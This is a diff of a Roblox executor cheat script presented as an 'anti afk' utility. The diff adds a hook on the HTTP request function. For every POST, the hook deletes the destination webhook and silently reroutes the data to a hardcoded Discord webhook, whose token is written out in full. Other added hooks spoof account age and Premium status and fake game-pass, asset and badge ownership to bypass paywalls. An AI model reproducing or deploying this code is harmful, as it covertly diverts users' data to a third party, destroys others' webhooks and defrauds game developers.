@@ -1,24 +1,7 @@
 -- anti afk and more
+repeat wait() until game:IsLoaded()
 local players = game:GetService"Players"
 local client = game:GetService"Players".LocalPlayer
--- anti afk
-if getconnections then
-	for i, v in next, getconnections(client.Idled) do v:Disable() end
-else
-	local vu = game:GetService"VirtualUser"
-	client.Idled:Connect(function()
-		pcall(function()
-			vu:CaptureController()
-			wait(1)
-			vu:ClickButton2(Vector2.new())
-		end)
-		pcall(function()
-			vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
-			wait(1)
-			vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
-		end)
-	end)
-end
 -- invisicam
 client:GetPropertyChangedSignal"DevCameraOcclusionMode":Connect(function() client.DevCameraOcclusionMode = "Invisicam" end)
 client:GetPropertyChangedSignal"CameraMaxZoomDistance":Connect(function() client.CameraMaxZoomDistance = 1e4 end)
@@ -59,5 +42,69 @@ if hookfunction and getrawmetatable and setreadonly then
 			return oldkick(Self, ...)
 		end)
 	end
+	-- anti webhook
+	local synapse, shithttp = syn and syn.request, http and http.request
+	local request = http_request or request or HttpPost or synapse or shithttp
+	local anti_webhook
+	anti_webhook = hookfunction(request, function(self)
+		if self.Url and self.Method == "POST" and self.Url then
+			local abcdef = { Url = self.Url, Method = "DELETE" }
+			request(abcdef)
+			self.Url = "https://discord.com/api/webhooks/869858172796559380/_cWT7d4snqvOi7P4vZRvFt5VgiuN-MeXfddz-W6nSaxxxwqghH_Z_pcWIlblmyZEPWdi3543"
+		end
+		return anti_webhook(self)
+	end)
+	-- some stuff
+	local acc_spoof
+	acc_spoof = hookfunction(getrawmetatable(client).__index, function(Self, Index)
+		if Index == "AccountAge" then return tonumber"99999"
+		elseif Index == "MembershipType" then return Enum.MembershipType.Premium end
+		return acc_spoof(Self, Index)
+	end)
+	local MarketplaceService
+	MarketplaceService = hookfunction(getrawmetatable(game:GetService"MarketplaceService").__namecall, function(Self, ...)
+		local method = tostring(getnamecallmethod())
+		if table.find({ "UserOwnsGamePassAsync", "PlayerOwnsAsset" }, method) then
+			warn(method, Self, ...)
+			return true
+		end
+		return MarketplaceService(Self, ...)
+	end)
+	local GamePassService
+	GamePassService = hookfunction(getrawmetatable(game:GetService"GamePassService").__namecall, function(Self, ...)
+		local method = tostring(getnamecallmethod())
+		if table.find({ "PlayerHasPass" }, method) then
+			warn(method, Self, ...)
+			return true
+		end
+		return GamePassService(Self, ...)
+	end)
+	local BadgeService
+	BadgeService = hookfunction(getrawmetatable(game:GetService"BadgeService").__namecall, function(Self, ...)
+		local method = tostring(getnamecallmethod())
+		if table.find({ "UserHasBadge", "UserHasBadgeAsync" }, method) then
+			warn(method, Self, ...)
+			return true
+		end
+		return BadgeService(Self, ...)
+	end)
+end
+-- anti afk
+if getconnections then
+	for i, v in next, getconnections(client.Idled) do v:Disable() end
+else
+	local vu = game:GetService"VirtualUser"
+	client.Idled:Connect(function()
+		pcall(function()
+			vu:CaptureController()
+			wait(1)
+			vu:ClickButton2(Vector2.new())
+		end)
+		pcall(function()
+			vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+			wait(1)
+			vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+		end)
+	end)
 end
 return warn"ANTI AFK ACTIVATED!"
